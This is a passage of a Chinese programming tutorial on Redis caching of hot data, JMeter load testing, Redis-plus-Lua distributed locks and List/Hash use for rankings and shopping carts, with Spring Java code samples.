cacheCaptcha!=<span class="keyword">null</span> &amp;&amp; cacheCaptcha.equalsIgnoreCase(captcha)) &#123;</span><br><span class="line">        redisTemplate.delete(key);</span><br><span class="line">        <span class="comment">//TODO 发送验证码</span></span><br><span class="line">        <span class="keyword">return</span> jsonData;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JsonData.buildResult(<span class="string">"图形验证码错误"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高并发商品首页热点数据开发实战"><a href="#高并发商品首页热点数据开发实战" class="headerlink" title="高并发商品首页热点数据开发实战"></a><strong>高并发商品首页热点数据开发实战</strong></h2><ul><li><p>热点数据</p><ul><li>经常会被查询，但是不经常被修改或者删除的数据</li><li>首页-详情页</li></ul></li><li><p>链路逻辑</p><ul><li>检查缓存是否有</li><li>缓存不存在则查询数据库</li><li>查询结果放到缓存，设置过期时间</li><li>下次访问则命中缓存</li></ul></li><li><p>接口开发</p><ul><li>模拟数据库查询耗时200ms</li><li>未加缓存逻辑：controller-service-dao层</li><li>加缓存逻辑：controller-service-dao层</li></ul></li><li><p>注意点</p><ul><li>缓存击穿</li><li>缓存穿透</li><li>缓存雪崩</li><li>缓存和数据库数据一致性</li></ul></li></ul><h2 id="Jmeter5-x压力测试工具急速入门"><a href="#Jmeter5-x压力测试工具急速入门" class="headerlink" title="Jmeter5.x压力测试工具急速入门"></a><strong>Jmeter5.x压力测试工具急速入门</strong></h2><ul><li><p>LoadRunner</p><ul><li>性能稳定，压测结果及细粒度大，可以自定义脚本进行压测，但是太过于重大，功能比较繁多</li></ul></li><li><p>Apache AB(单接口压测最方便)</p><ul><li>模拟多线程并发请求,ab命令对发出负载的计算机要求很低，既不会占用很多CPU，也不会占用太多的内存，但却会给目标服务器造成巨大的负载, 简单DDOS攻击等</li></ul></li><li><p>Webbench</p><ul><li>webbench首先fork出多个子进程，每个子进程都循环做web访问测试。子进程把访问的结果通过pipe告诉父进程，父进程做最终的统计结果。</li></ul></li><li><p>压测工具本地快速安装Jmeter5.x</p><ul><li>需要安装JDK8 以上</li><li>建议安装JDK环境，虽然JRE也可以，但是压测https需要JDK里面的 keytool工具</li><li>快速下载 <a href="https://jmeter.apache.org/download_jmeter.cgi" target="_blank" rel="noopener">https://jmeter.apache.org/download_jmeter.cgi</a></li><li>文档地址：<a href="http://jmeter.apache.org/usermanual/get-started.html" target="_blank" rel="noopener">http://jmeter.apache.org/usermanual/get-started.html</a></li></ul></li><li><p>目录</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bin:核心可执行文件，包含配置</span><br><span class="line">        jmeter.bat: windows启动文件(window系统一定要配置显示文件拓展名)</span><br><span class="line">        jmeter: mac或者linux启动文件</span><br><span class="line">        jmeter-server：mac或者Liunx分布式压测使用的启动文件</span><br><span class="line">        jmeter-server.bat：window分布式压测使用的启动文件</span><br><span class="line">        jmeter.properties: 核心配置文件   </span><br><span class="line">extras：插件拓展的包</span><br><span class="line"></span><br><span class="line">lib:核心的依赖包</span><br></pre></td></tr></table></figure><ul><li>Jmeter语言版本中英文切换<ul><li>控制台修改 menu -&gt; options -&gt; choose language</li></ul></li><li>配置文件修改<ul><li>bin目录 -&gt; jmeter.properties</li><li>默认 #language=en</li><li>改为 language=zh_CN</li></ul></li></ul><h2 id="Jmeter5-X基础功能组件介绍-线程组和Sampler"><a href="#Jmeter5-X基础功能组件介绍-线程组和Sampler" class="headerlink" title="Jmeter5.X基础功能组件介绍+线程组和Sampler"></a>Jmeter5.X基础功能组件介绍+线程组和Sampler</h2><p>添加-&gt;threads-&gt;线程组（控制总体并发）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">线程数：虚拟用户数。一个虚拟用户占用一个进程或线程</span><br><span class="line"></span><br><span class="line">准备时长（Ramp-Up Period(in seconds)）：全部线程启动的时长，比如100个线程，20秒，则表示20秒内 100个线程都要启动完成，每秒启动5个线程</span><br><span class="line"></span><br><span class="line">循环次数：每个线程发送的次数，假如值为5，100个线程，则会发送500次请求，可以勾选永远循环</span><br></pre></td></tr></table></figure><p>线程组-&gt;添加-&gt; Sampler(采样器) -&gt; Http （一个线程组下面可以增加几个Sampler）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">名称：采样器名称</span><br><span class="line">注释：对这个采样器的描述</span><br><span class="line">web服务器：</span><br><span class="line">  默认协议是http</span><br><span class="line">  默认端口是80</span><br><span class="line">  服务器名称或IP ：请求的目标服务器名称或IP地址</span><br><span class="line"></span><br><span class="line">路径：服务器URL</span><br></pre></td></tr></table></figure><p>查看测试结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">线程组-&gt;添加-&gt;监听器-&gt;察看结果树</span><br><span class="line">线程组-&gt;添加-&gt;监听器-&gt;聚合报告</span><br></pre></td></tr></table></figure><h2 id="Jmeter5-x压测接口实战-接口性能优化前后QPS对比"><a href="#Jmeter5-x压测接口实战-接口性能优化前后QPS对比" class="headerlink" title="Jmeter5.x压测接口实战-接口性能优化前后QPS对比"></a>Jmeter5.x压测接口实战-接口性能优化前后QPS对比</h2><p>热点数据接口压测</p><ul><li><p>QPS: (Query Per Second): 每秒请求数,就是说服务器在一秒的时间内处理了多少个请求</p></li><li><p>新增聚合报告：线程组-&gt;添加-&gt;监听器-&gt;聚合报告（Aggregate Report）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lable: sampler的名称</span><br><span class="line">Samples: 一共发出去多少请求,例如10个用户，循环10次，则是 100</span><br><span class="line">Average: 平均响应时间</span><br><span class="line">Median: 中位数，也就是 50％ 用户的响应时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">90% Line : 90％ 用户的响应不会超过该时间 （90% of the samples took no more than this time.     The remaining samples at least as long as this）</span><br><span class="line">95% Line : 95％ 用户的响应不会超过该时间</span><br><span class="line">99% Line : 99％ 用户的响应不会超过该时间</span><br><span class="line">min : 最小响应时间</span><br><span class="line">max : 最大响应时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Error%：错误的请求的数量&#x2F;请求的总数</span><br><span class="line">Throughput： 吞吐量——默认情况下表示每秒完成的请求数（Request per Second) 可类比为qps、tps</span><br><span class="line">KB&#x2F;Sec: 每秒接收数据量</span><br></pre></td></tr></table></figure><ul><li>基于当前机器配置压测<ul><li>未用缓存接口</li><li>用缓存接口</li></ul></li><li>当前架构存在的问题<ul><li>分布式缓存和应用服务器网络需要内网通信</li><li>自己本地部署Redis进行测试</li></ul></li></ul><h1 id="分布式锁之Redis6-Lua脚本实现原生分布式锁"><a href="#分布式锁之Redis6-Lua脚本实现原生分布式锁" class="headerlink" title="分布式锁之Redis6+Lua脚本实现原生分布式锁"></a>分布式锁之Redis6+Lua脚本实现原生分布式锁</h1><h2 id="高并发下分布式锁你知道多少"><a href="#高并发下分布式锁你知道多少" class="headerlink" title="高并发下分布式锁你知道多少"></a>高并发下分布式锁你知道多少</h2><p>背景</p><ul><li>就是保证同一时间只有一个客户端可以对共享资源进行操作</li><li>案例：优惠券领劵限制张数、商品库存超卖</li><li>核心<ul><li>为了防止分布式系统中的多个进程之间相互干扰，我们需要一种分布式协调技术来对这些进程进行调度</li><li>利用互斥机制来控制共享资源的访问，这就是分布式锁要解决的问题</li></ul></li></ul><p>避免共享资源并发操作导致数据问题</p><ul><li>加锁<ul><li>本地锁：synchronize、lock等，锁在当前进程内，集群部署下依旧存在问题</li><li>分布式锁：redis、zookeeper等实现，虽然还是锁，但是多个进程共用的锁标记，可以用Redis、Zookeeper、Mysql等都可以</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024192411.png" alt="image-20211024192408802"></p><ul><li><p>设计分布式锁应该考虑的东西</p><ul><li>排他性<ul><li>在分布式应用集群中，同一个方法在同一时间只能被一台机器上的一个线程执行</li></ul></li><li>容错性<ul><li>分布式锁一定能得到释放，比如客户端奔溃或者网络中断</li></ul></li><li>满足可重入、高性能、高可用</li><li>注意分布式锁的开销、锁粒度</li></ul><h2 id="基于Redis实现分布式锁的几种坑你是否踩过"><a href="#基于Redis实现分布式锁的几种坑你是否踩过" class="headerlink" title="基于Redis实现分布式锁的几种坑你是否踩过"></a>基于Redis实现分布式锁的几种坑你是否踩过</h2></li><li><p>实现分布式锁 可以用 Redis、Zookeeper、Mysql数据库这几种 , 性能最好的是Redis且是最容易理解</p><ul><li>分布式锁离不开 key - value 设置</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key 是锁的唯一标识，一般按业务来决定命名，比如想要给一种优惠券活动加锁，key 命名为 “coupon:id” 。value就可以使用固定值，比如设置成1</span><br></pre></td></tr></table></figure><p>基于redis实现分布式锁，文档：<a href="http://www.redis.cn/commands.html#string" target="_blank" rel="noopener">http://www.redis.cn/commands.html#string</a></p><ul><li>加锁 SETNX key value</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setnx 的含义就是 SET if Not Exists，有两个参数 setnx(key, value)，该方法是原子性操作</span><br><span class="line">如果 key 不存在，则设置当前 key 成功，返回 1；</span><br><span class="line">如果当前 key 已经存在，则设置当前 key 失败，返回 0</span><br></pre></td></tr></table></figure><ul><li>解锁 del (key)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到锁的线程执行完任务，需要释放锁，以便其他线程可以进入,调用 del(key)</span><br></pre></td></tr></table></figure><ul><li>配置锁超时 expire (key，30s）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端奔溃或者网络中断，资源将会永远被锁住,即死锁，因此需要给key配置过期时间，以保证即使没有被显式释放，这把锁也要在一定时间后自动释放</span><br></pre></td></tr></table></figure><ul><li>综合伪代码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">methodA()&#123;</span><br><span class="line">  String key = <span class="string">"coupon_66"</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(setnx(key，<span class="number">1</span>) == <span class="number">1</span>)&#123;<span class="comment">//设置成功，也就是获得锁</span></span><br><span class="line">      expire(key,<span class="number">30</span>,TimeUnit.MILLISECONDS)</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//做对应的业务逻辑</span></span><br><span class="line">          <span class="comment">//查询用户是否已经领券</span></span><br><span class="line">          <span class="comment">//如果没有则扣减库存</span></span><br><span class="line">          <span class="comment">//新增领劵记录</span></span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          del(key)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//没有设置成功，则睡眠100毫秒，然后自旋调用本方法</span></span><br><span class="line">    methodA()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在什么问题？</p><ul><li>多个命令之间不是原子性操作，如<code>setnx</code>和<code>expire</code>之间，如果<code>setnx</code>成功，但是<code>expire</code>失败，且宕机了，则这个资源就是死锁</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用原子命令：设置和配置过期时间  setnx &#x2F; setex</span><br><span class="line">如: set key 1 ex 30 nx</span><br><span class="line">java里面 redisTemplate.opsForValue().setIfAbsent(&quot;seckill_1&quot;,&quot;success&quot;,30,TimeUnit.MILLISECONDS)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024193424.png" alt="image-20211024193421973"></p><ul><li><p>业务超时，存在其他线程误删，key 30秒过期，假如线程A执行很慢超过30秒，则key就被释放了，其他线程B就得到了锁，这个时候线程A执行完成，而B还没执行完成，结果就是线程A删除了线程B加的锁</p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024195600.png" alt="image-20211024195545522" style="zoom: 67%;" /></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可以在 del 释放锁之前做一个判断，验证当前的锁是不是自己加的锁, 那 value 应该是存当前线程的标识或者uuid</span></span><br><span class="line"></span><br><span class="line">String key = <span class="string">"coupon_66"</span></span><br><span class="line">String value = Thread.currentThread().getId()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>（setnx（key，value） == <span class="number">1</span>）&#123;</span><br><span class="line">    expire(key,<span class="number">30</span>,TimeUnit.MILLISECONDS)</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//做对应的业务逻辑</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="comment">//删除锁，判断是否是当前线程加的</span></span><br><span class="line">      <span class="keyword">if</span>(get(key).equals(value))&#123;</span><br><span class="line">          <span class="comment">//还存在时间间隔</span></span><br><span class="line">          del（key）</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//睡眠100毫秒，然后自旋调用本方法</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>进一步细化误删<ul><li>当线程A获取到正常值时，判断value是自己的标识，返回到代码中判断期间锁过期了，线程B刚好重新设置了新值，线程A那边有判断value是自己的标识，然后调用del方法，结果就是删除了新设置的线程B的值</li><li>核心还是判断和删除命令 不是原子性操作导致</li></ul></li><li>总结<ul><li>加锁+配置过期时间：保证原子性操作</li><li>解锁: 防止误删除、也要保证原子性操作</li></ul></li><li>那如何解决呢？</li></ul><h2 id="分布式锁lua脚本-redis原生代码编写"><a href="#分布式锁lua脚本-redis原生代码编写" class="headerlink" title="分布式锁lua脚本+redis原生代码编写"></a>分布式锁lua脚本+redis原生代码编写</h2><p>前面说了redis做分布式锁存在的问题</p><ul><li>核心是保证多个指令原子性，加锁使用setnx setex 可以保证原子性，那解锁使用判断和删除怎么保证原子性</li><li>文档：<a href="http://www.redis.cn/commands/set.html" target="_blank" rel="noopener">http://www.redis.cn/commands/set.html</a></li><li>多个命令的原子性：采用 lua脚本+redis, 由于【判断和删除】是lua脚本执行，所以要么全成功，要么全失败</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取lock的值和传递的值一样，调用删除操作返回1，否则返回0</span></span><br><span class="line"></span><br><span class="line">String script = <span class="string">"if redis.call('get',KEYS[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Arrays.asList(lockKey)是key列表，uuid是参数</span></span><br><span class="line">Integer result = redisTemplate.execute(<span class="keyword">new</span> DefaultRedisScript&lt;&gt;(script, Integer<span class="class">.<span class="keyword">class</span>), <span class="title">Arrays</span>.<span class="title">asList</span>(<span class="title">lockKey</span>), <span class="title">uuid</span>)</span>;</span><br></pre></td></tr></table></figure><ul><li>全部代码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 原生分布式锁 开始</span></span><br><span class="line"><span class="comment">* 1、原子加锁 设置过期时间，防止宕机死锁</span></span><br><span class="line"><span class="comment">* 2、原子解锁：需要判断是不是自己的锁</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/api/v1/coupon"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CouponController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"add"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> JsonData <span class="title">saveCoupon</span><span class="params">(@RequestParam(value = <span class="string">"coupon_id"</span>,required = <span class="keyword">true</span>)</span> <span class="keyword">int</span> couponId)</span>&#123;</span><br><span class="line">        <span class="comment">//防止其他线程误删</span></span><br><span class="line">        String uuid = UUID.randomUUID().toString();</span><br><span class="line">        String lockKey = <span class="string">"lock:coupon:"</span>+couponId;</span><br><span class="line">        lock(couponId,uuid,lockKey);</span><br><span class="line">        <span class="keyword">return</span> JsonData.buildSuccess();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">(<span class="keyword">int</span> couponId,String uuid,String lockKey)</span></span>&#123;</span><br><span class="line">        <span class="comment">//lua脚本</span></span><br><span class="line">        String script = <span class="string">"if redis.call('get',KEYS[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end"</span>;</span><br><span class="line">        Boolean nativeLock = redisTemplate.opsForValue().setIfAbsent(lockKey,uuid,Duration.ofSeconds(<span class="number">30</span>));</span><br><span class="line">        System.out.println(uuid+<span class="string">"加锁状态:"</span>+nativeLock);</span><br><span class="line">        <span class="keyword">if</span>(nativeLock)&#123;</span><br><span class="line">            <span class="comment">//加锁成功</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//TODO 做相关业务逻辑</span></span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">10L</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">//解锁</span></span><br><span class="line">                Long result = redisTemplate.execute( <span class="keyword">new</span> DefaultRedisScript&lt;&gt;(script,Long<span class="class">.<span class="keyword">class</span>),<span class="title">Arrays</span>.<span class="title">asList</span>(<span class="title">lockKey</span>),<span class="title">uuid</span>)</span>;</span><br><span class="line">                System.out.println(<span class="string">"解锁状态:"</span>+result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//自旋操作</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">"加锁失败，睡眠5秒 进行自旋"</span>);</span><br><span class="line">                TimeUnit.MILLISECONDS.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; &#125;</span><br><span class="line">            <span class="comment">//睡眠一会再尝试获取锁</span></span><br><span class="line">            lock(couponId,uuid,lockKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遗留一个问题，锁的过期时间，如何实现锁的自动续期或者避免业务执行时间过长，锁过期了？</p><ul><li><p>原生方式的话，一般把锁的过期时间设置久一点，比如10分钟时间</p></li><li><p>原生代码+redis实现分布式锁使用比较复杂，且有些锁续期问题更难处理</p><ul><li>延伸出框架 官方推荐方式：<a href="https://redis.io/topics/distlock" target="_blank" rel="noopener">https://redis.io/topics/distlock</a></li></ul></li></ul><h1 id="分布缓存实战-List-Hash数据结构最佳案例实战"><a href="#分布缓存实战-List-Hash数据结构最佳案例实战" class="headerlink" title="分布缓存实战-List-Hash数据结构最佳案例实战"></a>分布缓存实战-List-Hash数据结构最佳案例实战</h1><h2 id="在线教育-天热销视频榜单实战-List数据结构设计"><a href="#在线教育-天热销视频榜单实战-List数据结构设计" class="headerlink" title="在线教育-天热销视频榜单实战-List数据结构设计"></a>在线教育-天热销视频榜单实战-List数据结构设计</h2><ul><li><p>需求</p><ul><li>小滴课堂官网需要一个视频学习榜单，每天更新一次</li><li>需要支持人工运营替换榜单位置</li></ul></li><li><p>企业中流程</p><ul><li>定时任务计算昨天最多人学习的视频</li><li>晚上12点到1点更新到榜单上</li><li>预留一个接口，支持人工运营</li></ul></li><li><p>类似场景</p><ul><li>京东：热销手机榜单、电脑榜单等</li><li>百度：搜索热榜</li></ul></li><li><p>疑惑：为啥不是实时计算，真正高并发下项目，都是预先计算好结果，然后直接返回数据，且存储结构最简单</p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024202113.png" alt="image-20211024202110517"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ul><li>开发接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"rank"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> JsonData <span class="title">videoRank</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List&lt;VideoDO&gt; list = redisTemplate.opsForList().range(RANK_KEY,<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> JsonData.buildSuccess(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveRank</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    String RANK_KEY = <span class="string">"rank:video"</span>;</span><br><span class="line">    VideoDO video1 = <span class="keyword">new</span> VideoDO(<span class="number">3</span>,<span class="string">"PaaS工业级微服务大课"</span>,<span class="string">"xdclass.net"</span>,<span class="number">1099</span>);</span><br><span class="line">    VideoDO video2 = <span class="keyword">new</span> VideoDO(<span class="number">5</span>,<span class="string">"AlibabaCloud全家桶实战"</span>,<span class="string">"xdclass.net"</span>,<span class="number">59</span>);</span><br><span class="line">    VideoDO video3 = <span class="keyword">new</span> VideoDO(<span class="number">53</span>,<span class="string">"SpringBoot2.X+Vue3综合实战"</span>,<span class="string">"xdclass.net"</span>,<span class="number">49</span>);</span><br><span class="line">    VideoDO video4 = <span class="keyword">new</span> VideoDO(<span class="number">15</span>,<span class="string">"玩转23种设计模式+最近实战"</span>,<span class="string">"xdclass.net"</span>,<span class="number">49</span>);</span><br><span class="line">    VideoDO video5 = <span class="keyword">new</span> VideoDO(<span class="number">45</span>,<span class="string">"Nginx网关+LVS+KeepAlive"</span>,<span class="string">"xdclass.net"</span>,<span class="number">89</span>);</span><br><span class="line">    redisTemplate.opsForList().leftPushAll(RANK_KEY,video4,video5,video3,video2,video1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>人工运营操作榜单</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 替换榜单第二名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replaceRank</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String RANK_KEY = <span class="string">"rank:video"</span>;</span><br><span class="line">    VideoDO video = <span class="keyword">new</span> VideoDO(<span class="number">42</span>,<span class="string">"小滴课堂面试专题第一季高级工程师"</span>,<span class="string">"xdclass.net"</span>,<span class="number">89</span>);</span><br><span class="line">    <span class="comment">//在集合的指定位置插入元素,如果指定位置已有元素，则覆盖，没有则新增</span></span><br><span class="line">    redisTemplate.opsForList().set(RANK_KEY,<span class="number">1</span>,video);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自营电商平台-购物车实现案例-Hash数据结构最佳实践"><a href="#自营电商平台-购物车实现案例-Hash数据结构最佳实践" class="headerlink" title="自营电商平台-购物车实现案例-Hash数据结构最佳实践"></a>自营电商平台-购物车实现案例-Hash数据结构最佳实践</h2><ul><li><p>背景</p><ul><li>电商购物车实现，支持买多件商品，每个商品可以买不同数量</li><li>支持高性能处理</li></ul></li><li><p>购物车常见实现方式</p><ul><li>实现方式一:存储到数据库<ul><li>性能存在瓶颈</li></ul></li><li>实现方式二:前端本地存储-localstorage-sessionstorage<ul><li>localstorage在浏览器中存储 key/value 对，没有过期时间。</li><li>sessionstorage在浏览器中存储 key/value 对,在关闭会话窗口后将会删除这些数据。</li></ul></li><li>实现方式三:后端存储到缓存如redis<ul><li>可以开启AOF持久化防止重启丢失(推荐)</li></ul></li></ul></li><li><p>购物车数据结构介绍</p><ul><li>一个购物车里面，存在多个购物项</li><li>所以 购物车结构是一个双层Map：<ul><li>Map&lt;String,Map&lt;String,String&gt;&gt;</li><li>第一层Map，Key是用户id</li><li>第二层Map，Key是购物车中商品id，值是购物车数据</li></ul></li></ul></li><li><p>对应redis里面的存储</p><ul><li>redis里面有多种数据结构，应该使用哪种？</li><li>答案是 hash结构</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024203006.png" alt="image-20211024203004336"></p></li></ul><h2 id="高并发下的互联网电商购物车实战-相关VO类和数据准备"><a href="#高并发下的互联网电商购物车实战-相关VO类和数据准备" class="headerlink" title="高并发下的互联网电商购物车实战-相关VO类和数据准备"></a>高并发下的互联网电商购物车实战-相关VO类和数据准备</h2><ul><li>CartItemVO——购物项</li><li>CartIVO——购物车</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 